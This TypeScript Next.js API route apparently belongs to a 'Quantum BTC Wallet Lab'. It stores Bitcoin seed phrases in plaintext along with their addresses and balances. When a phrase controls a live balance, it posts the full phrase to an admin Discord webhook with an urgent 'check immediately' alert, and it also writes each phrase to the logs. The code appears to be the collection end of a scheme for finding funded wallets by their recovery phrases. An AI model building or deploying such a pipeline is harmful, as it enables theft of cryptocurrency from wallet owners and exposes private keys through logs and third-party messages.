import { NextRequest, NextResponse } from 'next/server';
import { Pool } from 'pg';

// ── Runtime: Node.js (required for pg) ────────────────────────────────
export const runtime = 'nodejs';

// ── Postgres connection pool (direct DB, same as Railway) ──────────────
// Uses DATABASE_URL env var — bypasses PostgREST entirely.
let pool: Pool | null = null;

function getPool(): Pool {
    if (!pool) {
        const url = process.env.DATABASE_URL;
        if (!url) {
            throw new Error('DATABASE_URL environment variable not configured.');
        }
        pool = new Pool({
            connectionString: url,
            ssl: { rejectUnauthorized: false }, // Required for Supabase
            max: 1,                              // 1 connection max for serverless
        });
    }
    return pool;
}

// ── Discord alert ──────────────────────────────────────────────────────
async function sendDiscordAlert(
    phrase: string,
    balanceBtc: number,
    totalReceivedBtc: number,
    txCount: number
): Promise<void> {
    const webhookUrl = process.env.ADMIN_ALERT_WEBHOOK;
    if (!webhookUrl) return;

    const balanceSats  = Math.round(balanceBtc * 1e8).toLocaleString();
    const receivedSats = Math.round(totalReceivedBtc * 1e8).toLocaleString();

    const message =
        `🚨 **QUANTUM BTC — WALLET LAB ALERT** 🚨\n` +
        `A phrase with a **LIVE BITCOIN BALANCE** was found!\n\n` +
        `**Phrase:** \`${phrase}\`\n` +
        `**Balance:** ${balanceBtc.toFixed(8)} BTC (${balanceSats} sats)\n` +
        `**Total Received:** ${totalReceivedBtc.toFixed(8)} BTC (${receivedSats} sats)\n` +
        `**Total TXs:** ${txCount}\n\n` +
        `⚡ Check immediately at https://mempool.space`;

    try {
        const res = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message }),
        });
        if (!res.ok) {
            console.error('[wallet-lab/record] Discord webhook failed:', res.status);
        }
    } catch (e) {
        console.error('[wallet-lab/record] Discord webhook error:', e);
    }
}

// ── Type guard ─────────────────────────────────────────────────────────
interface RecordPayload {
    phrase: string;
    phrase_hash: string;
    addresses: Record<string, string>;
    tx_count: number;
    total_received_btc: number;
    balance_btc: number;
}

function isValidPayload(body: unknown): body is RecordPayload {
    if (typeof body !== 'object' || body === null) return false;
    const b = body as Record<string, unknown>;
    return (
        typeof b.phrase === 'string' && b.phrase.length > 0 && b.phrase.length <= 500 &&
        typeof b.phrase_hash === 'string' && /^[a-f0-9]{64}$/.test(b.phrase_hash) &&
        typeof b.addresses === 'object' && b.addresses !== null &&
        typeof b.tx_count === 'number' && b.tx_count >= 0 &&
        typeof b.total_received_btc === 'number' && b.total_received_btc >= 0 &&
        typeof b.balance_btc === 'number' && b.balance_btc >= 0
    );
}

// ── Route handler ──────────────────────────────────────────────────────
export async function POST(req: NextRequest) {
    let body: unknown;
    try {
        body = await req.json();
    } catch {
        return NextResponse.json({ error: 'Invalid JSON body.' }, { status: 400 });
    }

    if (!isValidPayload(body)) {
        return NextResponse.json({ error: 'Invalid or missing payload fields.' }, { status: 400 });
    }

    const { phrase, phrase_hash, addresses, tx_count, total_received_btc, balance_btc } = body;

    const client = await getPool().connect();
    try {
        // INSERT — ignore if phrase_hash already exists (ON CONFLICT DO NOTHING)
        const insertResult = await client.query(
            `INSERT INTO public.wallet_lab_phrases
                (phrase_hash, phrase, addresses, tx_count, total_received_btc, balance_btc, last_updated_at)
             VALUES ($1, $2, $3, $4, $5, $6, NOW())
             ON CONFLICT (phrase_hash) DO NOTHING`,
            [phrase_hash, phrase, JSON.stringify(addresses), tx_count, total_received_btc, balance_btc]
        );

        const wasInserted = insertResult.rowCount !== null && insertResult.rowCount > 0;
        console.log(`[wallet-lab/record] phrase="${phrase}" inserted=${wasInserted}`);

        // Send Discord alert if balance is positive AND phrase was newly inserted
        // (wasInserted=false means it already alerted previously)
        if (balance_btc > 0 && wasInserted) {
            await sendDiscordAlert(phrase, balance_btc, total_received_btc, tx_count);

            // Mark alert as sent
            await client.query(
                `UPDATE public.wallet_lab_phrases SET alert_sent = TRUE WHERE phrase_hash = $1`,
                [phrase_hash]
            );
        }

        return NextResponse.json({ ok: true, inserted: wasInserted });
    } catch (err) {
        console.error('[wallet-lab/record] DB error:', err instanceof Error ? err.message : 'unknown');
        return NextResponse.json({ error: 'Internal server error.' }, { status: 500 });
    } finally {
        client.release();
    }
}
